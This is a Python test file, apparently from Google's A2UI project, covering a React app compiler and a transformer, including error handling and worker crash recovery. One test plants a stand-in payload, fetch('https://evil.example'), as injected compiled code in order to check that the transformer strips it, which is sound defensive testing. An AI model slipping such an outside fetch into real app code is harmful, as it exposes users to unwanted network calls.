# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests of `ReactAppCompiler` and the server compile path in `ReactAppTransformer`."""

from __future__ import annotations

from collections.abc import Iterator
from pathlib import Path
from typing import Any

from a2ui.core import Catalog
from a2ui.core.basic_catalog import BasicCatalog
from a2ui.core.schema import AgentToRendererMessage
from a2ui.inference_formats import to_message_dicts
from pydantic import TypeAdapter
import pytest

from a2ui_react_app import (
    REACT_APP_CATALOG_ID,
    ReactAppCompiler,
    ReactAppTransformer,
    ReactAppValidationError,
    default_worker_path,
    react_app_bindings,
    react_app_catalog,
    react_app_examples,
)

_MESSAGES = TypeAdapter(list[AgentToRendererMessage])
_AGENT_CATALOG_ID = "https://example.com/agent/v1/catalog.json"
_AGENT_CATALOG = Catalog.from_json(
    catalog_schema={
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "catalogId": _AGENT_CATALOG_ID,
        "protocolVersion": "1.0",
        "components": {},
        "functions": {
            "estimateTravelTime": {
                "type": "object",
                "description": "Total travel minutes for the stops, in order.",
                "returnType": "number",
                "properties": {
                    "@call": {"const": "estimateTravelTime"},
                    "args": {
                        "type": "object",
                        "properties": {
                            "stops": {"type": "array", "items": {"type": "object"}}
                        },
                        "required": ["stops"],
                    },
                },
                "required": ["@call", "args"],
            }
        },
        "$defs": {
            "anyComponent": {"not": {}},
            "anyFunction": {"oneOf": [{"$ref": "#/functions/estimateTravelTime"}]},
        },
    },
    protocol_version="1.0",
    catalog_id=_AGENT_CATALOG_ID,
)
_CATALOGS = [BasicCatalog("1.0"), react_app_catalog(), _AGENT_CATALOG]

_TYPED_APP = """import { useEffect, useState } from "react";
import { estimateTravelTime } from "a2ui:bindings";
import { Text } from "a2ui";

export default function App() {
  const [minutes, setMinutes] = useState(0);
  useEffect(() => {
    estimateTravelTime({ stops: [{ id: "a" }] }).then(setMinutes);
  }, []);
  return <Text>{minutes}</Text>;
}
"""


@pytest.fixture(scope="module")
def compiler() -> Iterator[ReactAppCompiler]:
    if not default_worker_path().exists():
        pytest.skip(
            "Build @a2ui-labs/react-app-compiler first (yarn build in"
            " samples/community/react_app)."
        )
    with ReactAppCompiler() as instance:
        yield instance


def _app_messages(source: str, **extra: Any) -> list[AgentToRendererMessage]:
    return _MESSAGES.validate_python([
        {"version": "1.0", "createSurface": {"surfaceId": "s"}},
        {
            "version": "1.0",
            "updateComponents": {
                "surfaceId": "s",
                "components": [{
                    "id": "app",
                    "component": "ReactApp",
                    "catalogId": REACT_APP_CATALOG_ID,
                    "source": source,
                    "functions": ["estimateTravelTime"],
                    **extra,
                }],
            },
        },
    ])


def _first_app(messages: list[AgentToRendererMessage]) -> dict[str, Any]:
    for message in messages:
        dumped = message.model_dump(by_alias=True, exclude_none=True)
        for envelope in ("createSurface", "updateComponents"):
            for component in (dumped.get(envelope) or {}).get("components") or []:
                if component.get("component") == "ReactApp":
                    result: dict[str, Any] = component
                    return result
    raise AssertionError("No ReactApp component found")


def test_compiler_compiles_and_reports(compiler: ReactAppCompiler) -> None:
    bindings = react_app_bindings(_CATALOGS)

    good = compiler.compile(_TYPED_APP, bindings=bindings.declarations)
    bad_type = compiler.compile(
        _TYPED_APP.replace("{ stops: [", "{ stop: ["), bindings=bindings.declarations
    )
    bad_syntax = compiler.compile("export default function App() { const x = ; }\n")

    assert good.ok and good.compiled and 'from "a2ui:bindings"' in good.compiled
    assert compiler.startup_ms is not None and compiler.startup_ms >= 0
    assert not bad_type.ok and bad_type.compiled is not None
    assert [d.phase for d in bad_type.diagnostics] == ["type"]
    assert "stop" in bad_type.diagnostics[0].describe()
    assert not bad_syntax.ok and bad_syntax.compiled is None
    assert [d.phase for d in bad_syntax.diagnostics] == ["transpile"]


def test_transformer_fills_compiled_for_the_examples(
    compiler: ReactAppCompiler,
) -> None:
    transformer = ReactAppTransformer(on_error="raise", compiler=compiler)

    for turn in react_app_examples():
        result = transformer.process(turn)

        assert result.diagnostics == []
        assert len(result.compiles) == 1 and result.compiles[0].ok
        app = _first_app(result.messages)
        assert 'from "react/jsx-runtime"' in app["compiled"]
        assert "export default function App(" in app["compiled"]
        assert "<number>" not in app["compiled"]


def test_transformer_strips_payload_compiled_and_is_idempotent(
    compiler: ReactAppCompiler,
) -> None:
    injected = "fetch('https://evil.example'); export default () => null;"
    without_compiler = ReactAppTransformer(on_error="raise")
    stripped = without_compiler.transform_to_transport(
        _app_messages(_TYPED_APP, compiled=injected)
    )
    assert "compiled" not in _first_app(stripped)

    with_compiler = ReactAppTransformer(
        on_error="raise",
        compiler=compiler,
        bindings=react_app_bindings(_CATALOGS),
    )
    first = with_compiler.transform_to_transport(
        _app_messages(_TYPED_APP, compiled=injected)
    )
    first_app = _first_app(first)
    assert "evil.example" not in first_app["compiled"]
    assert 'from "a2ui:bindings"' in first_app["compiled"]

    second = with_compiler.transform_to_transport(first)
    assert to_message_dicts(second) == to_message_dicts(first)


def test_transformer_type_error_policies(compiler: ReactAppCompiler) -> None:
    bindings = react_app_bindings(_CATALOGS)
    bad = _app_messages(_TYPED_APP.replace("{ stops: [", "{ stop: ["))

    with pytest.raises(ReactAppValidationError) as exc_info:
        ReactAppTransformer(
            on_error="raise", compiler=compiler, bindings=bindings
        ).transform_to_transport(bad)
    assert [d.code for d in exc_info.value.diagnostics] == ["type_error"]

    lenient = ReactAppTransformer(
        on_error="raise", compiler=compiler, bindings=bindings, type_errors="warning"
    )
    messages = lenient.transform_to_transport(bad)
    assert _first_app(messages).get("compiled")


def test_transformer_logs_and_ships_without_compiled_when_worker_fails(
    tmp_path: Path,
) -> None:
    missing_worker = ReactAppCompiler(worker_path=tmp_path / "missing_worker.js")
    transformer = ReactAppTransformer(on_error="raise", compiler=missing_worker)
    turn = _app_messages(_TYPED_APP)

    process_result = transformer.process(turn)
    assert [d.code for d in process_result.diagnostics] == ["compile_unavailable"]
    assert "compiled" not in _first_app(process_result.messages)

    transport_messages = transformer.transform_to_transport(turn)
    assert "compiled" not in _first_app(transport_messages)


def test_worker_crash_restart_timeout_and_invalid_json(tmp_path: Path) -> None:
    # 1. Invalid JSON on the ready line kills and reaps the worker and raises RuntimeError.
    bad_ready = tmp_path / "bad_ready.mjs"
    bad_ready.write_text('process.stdout.write("not-json\\n");\n', encoding="utf-8")
    with ReactAppCompiler(worker_path=bad_ready, timeout=2.0) as client:
        with pytest.raises(RuntimeError, match="invalid JSON"):
            client.compile(_TYPED_APP)
        assert client._process is None

    # 2. Unready response kills the worker and does not leave it installed.
    unready = tmp_path / "unready.mjs"
    unready.write_text(
        'process.stdout.write(JSON.stringify({id: 0, ready: false}) + "\\n");\n',
        encoding="utf-8",
    )
    with ReactAppCompiler(worker_path=unready, timeout=2.0) as client:
        with pytest.raises(RuntimeError, match="didn't start"):
            client.compile(_TYPED_APP)
        assert client._process is None

    # 3. Worker timeout kills the worker; a subsequent call restarts a fresh worker.
    flaky = tmp_path / "flaky.mjs"
    state_file = tmp_path / "runs.txt"
    flaky.write_text(
        f"""import {{ readFileSync, writeFileSync }} from 'node:fs';
import {{ createInterface }} from 'node:readline';
const stateFile = {str(state_file)!r};
let runs = 0;
try {{ runs = Number(readFileSync(stateFile, 'utf8')); }} catch {{}}
writeFileSync(stateFile, String(runs + 1));
process.stdout.write(JSON.stringify({{ id: 0, ready: true, warmupMs: 1 }}) + '\\n');
createInterface({{ input: process.stdin }}).on('line', (line) => {{
  const req = JSON.parse(line);
  if (runs === 0) {{
    // Hang on the first worker instance to trigger a timeout.
    setTimeout(() => {{}}, 10000);
    return;
  }}
  if (runs === 1) {{
    // Crash mid-request on the second worker instance.
    process.exit(1);
  }}
  process.stdout.write(JSON.stringify({{
    id: req.id,
    ok: true,
    compiled: 'export default function App() {{ return null; }}',
    diagnostics: [],
    timings: {{ transpileMs: 1, typecheckMs: 1, totalMs: 2 }},
  }}) + '\\n');
}});
""",
        encoding="utf-8",
    )
    with ReactAppCompiler(worker_path=flaky, timeout=0.3) as client:
        with pytest.raises(RuntimeError, match="exited or timed out"):
            client.compile(_TYPED_APP)
        with pytest.raises(RuntimeError, match="exited or timed out"):
            client.compile(_TYPED_APP)
        recovered = client.compile(_TYPED_APP)
        assert recovered.ok and recovered.compiled is not None
